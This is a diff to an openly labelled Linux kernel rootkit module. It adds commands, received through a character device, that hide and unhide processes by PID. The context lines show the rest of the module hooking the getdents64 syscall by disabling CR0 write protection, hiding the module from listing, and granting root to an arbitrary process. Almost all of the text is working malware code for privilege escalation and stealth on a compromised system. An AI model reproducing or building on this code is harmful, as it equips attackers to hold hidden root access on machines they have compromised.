@@ -26,6 +26,7 @@
 #include <hooking.h>
 #include <priv_escalation.h>
 #include <module_hide.h>
+#include <proc_hiding.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("me");
@@ -59,6 +60,7 @@ static struct device *devStruct = NULL;
 /* syscall stuff */
 unsigned long *syscall_table;
 sys_getdents_t sys_getdents_original = NULL;
+sys_stat64_t sys_stat64_original = NULL;
 
 /* module hiding */
 int module_is_hidden = 0;
@@ -102,7 +104,7 @@ static int __init trivial_init(void) {
 		class_destroy(devClass);
 		unregister_chrdev(majorNum, DEVICE_NAME);
 		printk(KERN_ALERT "Failed to create rootkit device\n");
-		return -1;		// tmp value
+		return -1;	
 	}
 
 	/* get the syscall table in memory */
@@ -113,7 +115,13 @@ static int __init trivial_init(void) {
 
 	
 	sys_getdents_original = (sys_getdents_t) syscall_table[__NR_getdents64];
+	sys_stat64_original = (sys_stat64_t) syscall_table[__NR_stat64];
 
+	//write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
+	//syscall_table[__NR_stat64] =  sys_stat64_new;
+	//write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
+
+	init_hidden_procs();
 		
 	printk(KERN_INFO "Registered rootkit with the kernel. Thanks kernel\n");
 
@@ -123,6 +131,11 @@ static int __init trivial_init(void) {
 /* function called on module removal, should reverse init function */
 static void __exit trivial_exit(void) {
 	
+	
+	//write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
+	//syscall_table[__NR_stat64] = sys_stat64_original;
+	//write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
+
 	/* unregister the device, cover our traces */
 	device_destroy(devClass, MKDEV(majorNum, 0));
 	class_unregister(devClass);
@@ -173,6 +186,27 @@ static ssize_t trivial_write(struct file *f, const char *buff, size_t len, loff_
 				int pid = (int) simple_strtol(cmdPtr, NULL, 10);
 				give_root(pid);
 			}
+		}  else if (strncmp(cmdPtr, "unhide", 6) == SUCCESS) {
+			/* restore our hooked functions */
+			write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
+			syscall_table[__NR_getdents64] = sys_getdents_original;
+			write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
+			unhide_module(&module_is_hidden);
+
+		} else if (strncmp(cmdPtr, "hideproc", 8) == SUCCESS) {
+			cmdPtr = &cmdPtr[8]; 		// the beginning of the pid given
+			if ((*cmdPtr) != '\0') {
+				add_hidden_proc(cmdPtr);				
+			}
+
+		/* TODO: fix code duplication, probably with some sort of toggle */
+		} else if (strncmp(cmdPtr, "showproc", 8) == SUCCESS) {
+			cmdPtr = &cmdPtr[8]; 		// the beginning of the pid given
+			if ((*cmdPtr) != '\0') {
+				remove_hidden_proc(cmdPtr);
+
+			}
+		
 		} else if (strncmp(cmdPtr, "hide", 4) == SUCCESS) {
 			hide_module(&module_is_hidden);
 			/* hook syscall table */
@@ -180,12 +214,6 @@ static ssize_t trivial_write(struct file *f, const char *buff, size_t len, loff_
 			syscall_table[__NR_getdents64] = sys_getdents_new;
 			write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
 
-		} else if (strncmp(cmdPtr, "unhide", 6) == SUCCESS) {
-			/* restore our hooked functions */
-			write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
-			syscall_table[__NR_getdents64] = sys_getdents_original;
-			write_cr0(read_cr0() | WRITE_PROTECT_FLAG);
-			unhide_module(&module_is_hidden);
 		}
 	}
 	kfree(privBuf);		// leave no trace
